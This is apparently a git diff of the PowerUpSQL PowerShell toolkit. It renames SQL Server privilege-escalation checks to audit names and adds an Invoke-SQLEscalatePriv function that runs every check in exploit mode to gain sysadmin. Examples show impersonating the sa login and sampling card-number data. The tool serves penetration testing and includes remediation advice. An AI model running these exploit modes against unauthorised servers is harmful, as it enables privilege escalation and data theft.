@@ -7455,7 +7455,7 @@ Function  Get-SQLInstanceFile {
 # ---------------------------------------
 # Author: Scott Sutherland
 # Note: This is just a template for building other escalation functions.
-Function Invoke-SQLEscalate-Template {
+Function Invoke-SQLAuditTemplate {
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -7588,10 +7588,10 @@ Function Invoke-SQLEscalate-Template {
 
 
 # ---------------------------------------
-# Invoke-SQLEscalate-ServerLink 
+# Invoke-SQLAuditPrivServerLink 
 # ---------------------------------------
 # Author: Scott Sutherland
-Function Invoke-SQLEscalate-ServerLink {
+Function Invoke-SQLAuditPrivServerLink {
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -7682,9 +7682,9 @@ Function Invoke-SQLEscalate-ServerLink {
         $Exploited     = "No"
         $ExploitCmd    = "There is not exploit available at this time."
         if($Username){
-            #$ExploitCmd    = "Invoke-SQLEscalate-ServerLink -Instance $Instance -Username $Username -Password $Password -Exploit"
+            #$ExploitCmd    = "Invoke-SQLAuditPrivServerLink -Instance $Instance -Username $Username -Password $Password -Exploit"
         }else{
-            #$ExploitCmd    = "Invoke-SQLEscalate-ServerLink -Instance $Instance -Exploit"
+            #$ExploitCmd    = "Invoke-SQLAuditPrivServerLink -Instance $Instance -Exploit"
         }
         $Details       = ""   
         $Reference     = "https://msdn.microsoft.com/en-us/library/ms190479.aspx"       
@@ -7749,10 +7749,10 @@ Function Invoke-SQLEscalate-ServerLink {
 
 
 # ---------------------------------------
-# Invoke-SQLEscalate-TrustedDatabase
+# Invoke-SQLAuditPrivTrustworthy
 # ---------------------------------------
 # Author: Scott Sutherland
-Function Invoke-SQLEscalate-TrustedDatabase{
+Function Invoke-SQLAuditPrivTrustworthy{
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -7834,8 +7834,8 @@ Function Invoke-SQLEscalate-TrustedDatabase{
         }else{
             $TestMode  = "Audit"
         }         
-        $Vulnerability = "Excessive Privilege - Trusted Database"
-        $Description   = "One or more database is configured as trustworthy.  Combined with other weak configurations it can lead to user impersonation and arbitrary code exection on the server."
+        $Vulnerability = "Excessive Privilege - Trustworthy Database"
+        $Description   = "One or more database is configured as trustworthy.  The TRUSTWORTHY database property is used to indicate whether the instance of SQL Server trusts the database and the contents within it.  Including potentially malicious assemblies with an EXTERNAL_ACCESS or UNSAFE permission setting. Also, potentially malicious modules that are defined to execute as high privileged users. Combined with other weak configurations it can lead to user impersonation and arbitrary code exection on the server."
         $Remediation   = "Configured the affected database so the 'is_trustworthy_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE MyAppsDb SET TRUSTWORTHY ON' is used to set a database as trustworthy.  A query similar to 'ALTER DATABASE MyAppDb SET TRUSTWORTHY OFF' can be use to unset it."
         $Severity      = "Low" 
         $IsVulnerable  = "No"
@@ -7902,10 +7902,10 @@ Function Invoke-SQLEscalate-TrustedDatabase{
 
 
 # ---------------------------------------
-# Invoke-SQLEscalate-CreateProcedure
+# Invoke-SQLAuditPrivCreateProcedure
 # ---------------------------------------
 # Author: Scott Sutherland
-Function Invoke-SQLEscalate-CreateProcedure {
+Function Invoke-SQLAuditPrivCreateProcedure {
 <#
     .SYNOPSIS
         Check if the current login has the CREATE PROCEDURE permission.  Attempt to leverage to obtain sysadmin privileges.
@@ -7922,7 +7922,7 @@ Function Invoke-SQLEscalate-CreateProcedure {
     .PARAMETER Exploit
         Exploit vulnerable issues
     .EXAMPLE
-        PS C:\> Get-SQLInstanceLocal | Invoke-SQLEscalate-CreateProcedure -Username evil -Password Password123!
+        PS C:\> Get-SQLInstanceLocal | Invoke-SQLAuditPrivCreateProcedure -Username evil -Password Password123!
 
         ComputerName  : SQLServer1
         Instance      : SQLServer1\STANDARDDEV2014
@@ -8123,11 +8123,11 @@ Function Invoke-SQLEscalate-CreateProcedure {
 
 
 # ---------------------------------------
-# Invoke-SQLEscalate-WeakLoginPw
+# Invoke-SQLAuditWeakLoginPw
 # ---------------------------------------
 # add seperate login fields to support fuzz
 # Author: Scott Sutherland
-Function Invoke-SQLEscalate-WeakLoginPw{
+Function Invoke-SQLAuditWeakLoginPw{
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -8421,10 +8421,10 @@ Function Invoke-SQLEscalate-WeakLoginPw{
 
 
 # ---------------------------------------
-# Invoke-SQLEscalate-DbOwnerRole
+# Invoke-SQLAuditRoleDbOwner
 # ---------------------------------------
 # Author: Scott Sutherland
-Function Invoke-SQLEscalate-DbOwnerRole {
+Function Invoke-SQLAuditRoleDbOwner {
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -8519,9 +8519,9 @@ Function Invoke-SQLEscalate-DbOwnerRole {
         $IsExploitable = "No" 
         $Exploited     = "No"
         if($Username){
-            $ExploitCmd    = "Invoke-SQLEscalate-DbOwnerRole -Instance $Instance -Username $Username -Password $Password -Exploit"
+            $ExploitCmd    = "Invoke-SQLAuditRoleDbOwner -Instance $Instance -Username $Username -Password $Password -Exploit"
         }else{
-            $ExploitCmd    = "Invoke-SQLEscalate-DbOwnerRole -Instance $Instance -Exploit"
+            $ExploitCmd    = "Invoke-SQLAuditRoleDbOwner -Instance $Instance -Exploit"
         }
         $Details       = ""   
         $Dependancies = "Affected databases must be owned by a sysadmin and be trusted."
@@ -8640,10 +8640,10 @@ Function Invoke-SQLEscalate-DbOwnerRole {
 
 
 # ---------------------------------------
-# Invoke-SQLEscalate-DbDdlAdmin
+# Invoke-SQLAuditRoleDbDdlAdmin
 # ---------------------------------------
 # Author: Scott Sutherland
-Function Invoke-SQLEscalate-DbDdlAdmin {
+Function Invoke-SQLAuditRoleDbDdlAdmin {
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -8842,10 +8842,10 @@ Function Invoke-SQLEscalate-DbDdlAdmin {
 
 
 # -----------------------------------
-# Invoke-SQLEscalate-ImpersonateLogin
+# Invoke-SQLAuditPrivImpersonateLogin
 # -----------------------------------
 # Author: Scott Sutherland
-Function Invoke-SQLEscalate-ImpersonateLogin {
+Function Invoke-SQLAuditPrivImpersonateLogin {
 <#
     .SYNOPSIS
         Check if the current login has the IMPERSONATE permission on any sysadmin logins. Attempt to use permission to obtain sysadmin privileges.
@@ -8862,7 +8862,7 @@ Function Invoke-SQLEscalate-ImpersonateLogin {
     .PARAMETER Exploit
         Exploit vulnerable issues
     .EXAMPLE
-        PS C:\> Invoke-SQLEscalate-ImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Username evil -Password Password123!
+        PS C:\> Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Username evil -Password Password123!
 
         ComputerName  : SQLServer1
         Instance      : SQLServer1\STANDARDDEV2014
@@ -8874,12 +8874,12 @@ Function Invoke-SQLEscalate-ImpersonateLogin {
         IsVulnerable  : Yes
         IsExploitable : Yes
         Exploited     : No
-        ExploitCmd    : Invoke-SQLEscalate-ImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
+        ExploitCmd    : Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
         Details       : public can impersonate the sa SYSADMIN login. This test was ran with the evil login.
         Reference     : https://msdn.microsoft.com/en-us/library/ms181362.aspx
         Author        : Scott Sutherland (@_nullbind), NetSPI 2016
     .EXAMPLE
-        PS C:\> Invoke-SQLEscalate-ImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Username evil -Password Password123! -Exploit
+        PS C:\> Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Username evil -Password Password123! -Exploit
 
         ComputerName  : SQLServer1
         Instance      : SQLServer1\STANDARDDEV2014
@@ -8891,7 +8891,7 @@ Function Invoke-SQLEscalate-ImpersonateLogin {
         IsVulnerable  : Yes
         IsExploitable : Yes
         Exploited     : Yes
-        ExploitCmd    : Invoke-SQLEscalate-ImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
+        ExploitCmd    : Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
         Details       : public can impersonate the sa SYSADMIN login. This test was ran with the evil login.
         Reference     : https://msdn.microsoft.com/en-us/library/ms181362.aspx
         Author        : Scott Sutherland (@_nullbind), NetSPI 2016
@@ -8983,14 +8983,14 @@ Function Invoke-SQLEscalate-ImpersonateLogin {
         }else{
             $TestMode  = "Audit"
         }         
-        $Vulnerability = "PERMISSION - IMPERSONATE LOGIN"
+        $Vulnerability = "Excessive Privilege - Impersonate Login"
         $Description   = "The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges."
         $Remediation   = "Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]"
         $Severity      = "High"
         $IsVulnerable  = "No"
         $IsExploitable = "No" 
         $Exploited     = "No"     
-        $ExploitCmd    = "Invoke-SQLEscalate-ImpersonateLogin -Instance $Instance -Exploit"
+        $ExploitCmd    = "Invoke-SQLAuditPrivImpersonateLogin -Instance $Instance -Exploit"
         $Details       = ""   
         $Reference     = "https://msdn.microsoft.com/en-us/library/ms181362.aspx"       
         $Author        = "Scott Sutherland (@_nullbind), NetSPI 2016"        
@@ -9097,10 +9097,10 @@ Function Invoke-SQLEscalate-ImpersonateLogin {
 
 
 # ---------------------------------------
-# Invoke-SQLEscalate-SampleDataByColumn
+# Invoke-SQLAuditSampleDataByColumn
 # ---------------------------------------
 # Author: Scott Sutherland
-Function Invoke-SQLEscalate-SampleDataByColumn {
+Function Invoke-SQLAuditSampleDataByColumn {
 <#
     .SYNOPSIS
         Check if the current login can access any database columns that contain the word password. Supports column name keyword search and custom data sample size. 
@@ -9122,7 +9122,7 @@ Function Invoke-SQLEscalate-SampleDataByColumn {
     .PARAMETER Keyword
         Column name to search for.
     .EXAMPLE
-        PS C:\> Invoke-SQLEscalate-SampleDataByColumn -Instance SQLServer1\STANDARDDEV2014 -Keyword card -SampleSize 2 -Exploit
+        PS C:\> Invoke-SQLAuditSampleDataByColumn -Instance SQLServer1\STANDARDDEV2014 -Keyword card -SampleSize 2 -Exploit
 
         ComputerName  : SQLServer1
         Instance      : SQLServer1\STANDARDDEV2014
@@ -9133,7 +9133,7 @@ Function Invoke-SQLEscalate-SampleDataByColumn {
         IsVulnerable  : Yes
         IsExploitable : Yes
         Exploited     : Yes
-        ExploitCmd    : Invoke-SQLEscalate-SampleDataByColumn -Instance SQLServer1\STANDARDDEV2014 -Exploit
+        ExploitCmd    : Invoke-SQLAuditSampleDataByColumn -Instance SQLServer1\STANDARDDEV2014 -Exploit
         Details       : Data sample from [testdb].[dbo].[tracking].[card] : "4111111111111111" "4111111111111112".
         Reference     : https://msdn.microsoft.com/en-us/library/ms188348.aspx
         Author        : Scott Sutherland (@_nullbind), NetSPI 2016
@@ -9238,7 +9238,7 @@ Function Invoke-SQLEscalate-SampleDataByColumn {
         $IsVulnerable  = "No"
         $IsExploitable = "No" 
         $Exploited     = "No"
-        $ExploitCmd    = "Invoke-SQLEscalate-SampleDataByColumn -Instance $Instance -Exploit"
+        $ExploitCmd    = "Invoke-SQLAuditSampleDataByColumn -Instance $Instance -Exploit"
         $Details       = ""   
         $Reference     = "https://msdn.microsoft.com/en-us/library/ms188348.aspx"       
         $Author        = "Scott Sutherland (@_nullbind), NetSPI 2016"         
@@ -10071,15 +10071,16 @@ function Invoke-Parallel {
 
 #########################################################################
 #
-#region          Invoke-PowerUpSQL WRAPPER FUNCTION
+#region                 Primary FUNCTIONs
+#          Invoke-SQLDump, Invoke-SQLAudit, Invoke-SQLEscalatePriv
 #
 #########################################################################
 
 # ----------------------------------
-# Invoke-PowerUpSQL
+# Invoke-SQLAudit
 # ----------------------------------
 # Author: Scott Sutherland
-Function Invoke-PowerUpSQL {
+Function Invoke-SQLAudit {
 <#
     .SYNOPSIS
         Audit for high impact weak configurations by running all privilege escalation checks.
@@ -10097,7 +10098,7 @@ Function Invoke-PowerUpSQL {
     .PARAMETER Exploit
         Exploit vulnerable issues.
     .EXAMPLE
-        PS C:\> Invoke-PowerUpSQL -Instance SQLServer1\STANDARDDEV2014 -user evil -Password Password123!
+        PS C:\> Invoke-SQLAudit -Instance SQLServer1\STANDARDDEV2014 -user evil -Password Password123!
 
         ComputerName  : SQLServer1
         Instance      : SQLServer1\STANDARDDEV2014
@@ -10109,14 +10110,14 @@ Function Invoke-PowerUpSQL {
         IsVulnerable  : Yes
         IsExploitable : Yes
         Exploited     : No
-        ExploitCmd    : Invoke-SQLEscalate-ImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
+        ExploitCmd    : Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
         Details       : evil can impersonate the sa SYSADMIN login. This test was ran with the evil login.
         Reference     : https://msdn.microsoft.com/en-us/library/ms181362.aspx
         Author        : Scott Sutherland (@_nullbind), NetSPI 2016
 
         [TRUNCATED]
     .EXAMPLE
-        PS C:\> Invoke-PowerUpSQL -Instance SQLServer1\STANDARDDEV2014 -user evil -Password Password123! -Exploit
+        PS C:\> Invoke-SQLAudit -Instance SQLServer1\STANDARDDEV2014 -user evil -Password Password123! -Exploit
         ComputerName  : SQLServer1
         Instance      : SQLServer1\STANDARDDEV2014
         Vulnerability : PERMISSION - IMPERSONATE LOGIN
@@ -10127,7 +10128,7 @@ Function Invoke-PowerUpSQL {
         IsVulnerable  : Yes
         IsExploitable : Yes
         Exploited     : Yes
-        ExploitCmd    : Invoke-SQLEscalate-ImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
+        ExploitCmd    : Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
         Details       : evil can impersonate the sa SYSADMIN login. This test was ran with the evil login.
         Reference     : https://msdn.microsoft.com/en-us/library/ms181362.aspx
         Author        : Scott Sutherland (@_nullbind), NetSPI 2016
@@ -10190,14 +10191,14 @@ Function Invoke-PowerUpSQL {
         Write-Verbose "LOADING VULNERABILITY CHECKS."
         
         # Load list of vulnerability check functions - Server / database
-        $TblVulnFunc.Rows.Add("Invoke-SQLEscalate-ImpersonateLogin","Server") | Out-Null
-        $TblVulnFunc.Rows.Add("Invoke-SQLEscalate-DbDdlAdmin","Server") | Out-Null   
-        $TblVulnFunc.Rows.Add("Invoke-SQLEscalate-WeakLoginPw","Server") | Out-Null 
-        $TblVulnFunc.Rows.Add("Invoke-SQLEscalate-DbOwnerRole","Server") | Out-Null           
-        $TblVulnFunc.Rows.Add("Invoke-SQLEscalate-ServerLink","Server") | Out-Null
-        $TblVulnFunc.Rows.Add("Invoke-SQLEscalate-TrustedDatabase","Server") | Out-Null
-        $TblVulnFunc.Rows.Add("Invoke-SQLEscalate-CreateProcedure","Server") | Out-Null
-        $TblVulnFunc.Rows.Add("Invoke-SQLEscalate-SampleDataByColumn","Database") | Out-Null               
+        $TblVulnFunc.Rows.Add("Invoke-SQLAuditPrivImpersonateLogin","Server") | Out-Null
+        $TblVulnFunc.Rows.Add("Invoke-SQLAuditPrivServerLink","Server") | Out-Null
+        $TblVulnFunc.Rows.Add("Invoke-SQLAuditPrivTrustworthy","Server") | Out-Null
+        $TblVulnFunc.Rows.Add("Invoke-SQLAuditPrivCreateProcedure","Server") | Out-Null
+        $TblVulnFunc.Rows.Add("Invoke-SQLAuditRoleDbDdlAdmin","Server") | Out-Null
+        $TblVulnFunc.Rows.Add("Invoke-SQLAuditRoleDbOwner","Server") | Out-Null                
+        $TblVulnFunc.Rows.Add("Invoke-SQLAuditWeakLoginPw","Server") | Out-Null       
+        $TblVulnFunc.Rows.Add("Invoke-SQLAuditSampleDataByColumn","Database") | Out-Null               
 
         Write-Verbose "RUNNING VULNERABILITY CHECKS."
     }
@@ -10251,4 +10252,95 @@ Function Invoke-PowerUpSQL {
         }   
     }
 }
+
+
+# ----------------------------------
+# Invoke-SQLEscalatePriv
+# ----------------------------------
+# Author: Scott Sutherland
+Function Invoke-SQLEscalatePriv {
+<#
+    .SYNOPSIS
+        This function can be used to attempt to obtain sysadmin privileges via identify vulnerabilities.
+    .PARAMETER Username
+        SQL Server or domain account to authenticate with.   
+    .PARAMETER Password
+        SQL Server or domain account password to authenticate with. 
+    .PARAMETER Credential
+        SQL Server credential. 
+    .PARAMETER Instance
+        SQL Server instance to connection to. 
+    .PARAMETER NoOutput
+        Don't output anything.
+    .PARAMETER Exploit
+        Exploit vulnerable issues.
+    .EXAMPLE
+        PS C:\> Invoke-SQLEscalatePriv -Instance SQLServer1\STANDARDDEV2014 -user evil -Password Password123!
+#>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$false,
+        HelpMessage="SQL Server or domain account to authenticate with.")]
+        [string]$Username,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="SQL Server or domain account password to authenticate with.")]
+        [string]$Password,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Windows credentials.")]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+        
+        [Parameter(Mandatory=$false,
+        ValueFromPipelineByPropertyName=$true,
+        HelpMessage="SQL Server instance to connection to.")]
+        [string]$Instance
+    )
+
+    Begin
+    {
+    }
+
+    Process
+    {              
+        # Test connection to server
+        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
+        if(-not $TestConnection){
+            Return
+        }
+
+        # Default connection to local default instance
+        if(-not $Instance){
+            $Instance = $env:COMPUTERNAME
+        }
+
+        # Check for sysadmin
+        Write-Verbose "$Instance : Checking if you're already a sysadmin..."        
+        $IsSysadmin =  Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object IsSysadmin -ExpandProperty IsSysadmin               
+        if($IsSysadmin -eq "Yes"){
+             Write-Verbose "$Instance : You are, so nothing to do here. :)"     
+        }else{
+            Write-Verbose "$Instance : You're not a sysadmin, attempting to change that..."
+            Invoke-SQLAudit -Instance $Instance -Username $Username -Password $Password -Credential $Credential -NoOutput -Exploit
+            
+            # Check for sysadmin again
+            $IsSysadmin2 =  Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object IsSysadmin -ExpandProperty IsSysadmin                           
+            if($IsSysadmin2 -eq "Yes"){
+                Write-Verbose "$Instance : Success! You are now a sysadmin!"
+            }else{
+                Write-Verbose "$Instance : Fail. We couldn't get you sysadmin access today."
+            }            
+        }
+    }
+        
+    End
+    {
+        # Return full results table
+        if ( -not $NoOutput){            
+            Return $TblData
+        }   
+    }
+}
+
 #endregion
